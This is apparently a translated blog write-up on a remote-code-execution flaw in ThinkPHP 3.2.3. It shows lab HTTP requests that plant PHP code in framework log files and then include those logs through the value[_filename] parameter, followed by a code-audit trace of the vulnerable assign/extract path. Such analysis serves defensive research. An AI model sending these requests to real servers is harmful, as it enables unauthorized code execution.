# ThinkPHP3.2.x RCE

Author: H3rmeks1t

Data: 2021.08.03

# Initial configuration

- Here we use `ThinkPHP3.2.3` as an example, [click here to download](http://www.thinkphp.cn/donate/download/id/610.html)
- In the downloaded source code, the content of `Application/Home/Controller/IndexController.class.php` needs to be modified

```php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index($value=''){
        $this->assign($value);
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "Microsoft Yahei"; color: #333;font-size: 24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"<h1>:)</h1><p>Welcome to <b>ThinkPHP</b>! </p><br/> Version V{$Think.version}</div><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_55e75dfae343f5a1"></thinkad><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script>','utf-8');
    }
}
```

# Vulnerability Exploit

Use `burpsuite` to capture and modify packages to avoid coding problems and cause vulnerabilities to be exploited
## debug mode is enabled
![Insert the picture description here](https://img-blog.csdnimg.cn/9ccfc8bf31894e5ea1fb2c25f0671884.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
First use the `Thinkphp Getshell` tool to detect whether the vulnerability exists

![Insert the picture description here](https://img-blog.csdnimg.cn/54093f5756724618af86ca6f9d03bce5.png#pic_center)

Request a packet, check the log file `Application/Runtime/Logs/Home/21_08_02.log` and find that it is successfully written.

````bas
GET /cms/index.php?m=Home&c=Index&a=index&test=--><?=phpinfo();?HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close
```
![Insert the picture description here](https://img-blog.csdnimg.cn/b61d85c51d7841ef8373e48930deedd3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Construct an attack request and successfully trigger the vulnerability

```bash
GET /cms/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/21_08_02.log HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close
```
![Insert the picture description here](https://img-blog.csdnimg.cn/7fe012fbd2b24bdda423c12367dff181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## debug mode is not enabled
![Insert the picture description here](https://img-blog.csdnimg.cn/e5674e7a7dde47268f902c9e7b5fbe56.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
Request a packet

````bas
GET /cms/index.php?m=--><?=phpinfo();?HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookies:
PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close
```
Construct an attack request and successfully trigger the vulnerability

```bash
GET /cms/index.php?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/21_08_02.log HTTP/1.1
Host: 192.168.10.9
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=rfpmtb683svnoh5emql41ka803
Connection: close
```
## File contains\upload

Upload any file with malicious code to the server and directly include its relative or absolute paths of the file.

````bas
http://192.168.10.9/cms/index.php?m=Home&c=Index&a=index&value[_filename]=./phpinfo.php
```
![Insert the picture description here](https://img-blog.csdnimg.cn/51be7c7e3e3c4f1383e29e90e06eaed0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

# Vulnerability Analysis
## Program execution process

![Insert the picture description here](https://img-blog.csdnimg.cn/51780ca4fe034ff29a0dac5767cb211f.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## Vulnerability Exploit Principles
In the program of ThinkPHP3.2.3 framework, if you want to output variables in a template, you need to pass the variables to the template in the controller. The system provides an assign method to assign values ​​to the template variables. The exploitation condition of this vulnerability is that the first variable of the assign method is controllable.

## Local code audit

Follow up on `Application/Home/Controller/IndexController.class.php` first. The first variable in the `assign` method in the function code is a controllable variable

![Insert the picture description here](https://img-blog.csdnimg.cn/a6b90b743ff3481eb416b67bb8b6d1d2.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Search for `assign` globally, follow up `ThinkPHP/Library/Think/View.class.php`, enter the assign method to the `$this→tVar` variable

![Insert the picture description here](https://img-blog.csdnimg.cn/f99d82bcab6448bc8a08aa9bced950fb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `show` method, follow up on `ThinkPHP/Library/Think/Controller.class.php`, and find that the `display` method has been further called.

![Insert the picture description here](https://img-blog.csdnimg.cn/476e0743b5b0469aa8ede3707a6db219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Search the `display` method globally, follow up the `ThinkPHP/Library/Think/View.class.php`, and start parsing and obtaining the template file content. At this time, the template file path and content are empty.

![Insert the picture description here](https://img-blog.csdnimg.cn/fc484aabf963478295ae912b17c488d5.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `fetch` method. When the passed parameters are empty, the default template file location will be obtained according to the configuration. After that, the default template engine configured by the system is think, so it will enter the else branch and get the `$this→tVar` variable value assigned to `$params`, and then enter the `Hook::listen` method

![Insert the picture description here](https://img-blog.csdnimg.cn/0bed374945df474cbf3d96f8f80bbe47.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `listen` method, follow up `ThinkPHP/Library/Think/Hook.class.php`, and enter the `exec` method

![Insert the picture description here](https://img-blog.csdnimg.cn/8256f4599af14d469e0766fb2485cce8.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `exec` method, and after processing, call the `Behavior\ParseTemplate` method in the `Behavior\ParseTemplateBehavior` class to process the value of `$params` with the log file path.

![Insert the picture description here](https://img-blog.csdnimg.cn/6f2307b1caea4859a2771302e119c93e.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Enter the `run` method, follow up on `ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php`, enter the else branch and call the `Fetch` method in the `Think\Template` class to process the variable `$_data`

![Insert the image description here](https://img-blog.csdnimg.cn/1be04e3cc0a541178ea7097830e9e6fa.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5n
aGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up on `ThinkPHP/Library/Think/Template.class.php`, get the cache file path and enter the `load` method of Storage

![Insert the picture description here](https://img-blog.csdnimg.cn/c6b56074d1cb48beb24cd4860394b0bd.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Follow up to the load method of `ThinkPHP/Library/Think/Storage/Driver/File.class.php`, `$_filename` is the cache file path obtained before, `$vars` is an array with _filename=log file path. `$vars` is not empty, the EXTR_OVERWRITE default description of the `extract` method is overwritten. Then include the log file path, resulting in the file being included, triggering the `ThinkPHP 3.x Log RCE` vulnerability

![Insert the picture description here](https://img-blog.csdnimg.cn/36cd17cc3e7f43f495d10471492d1cd6.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Vulnerability notification

[Click here to view vulnerability notification](https://mp.weixin.qq.com/s/_4IZe-aZ_3O2PmdQrVbpdQ)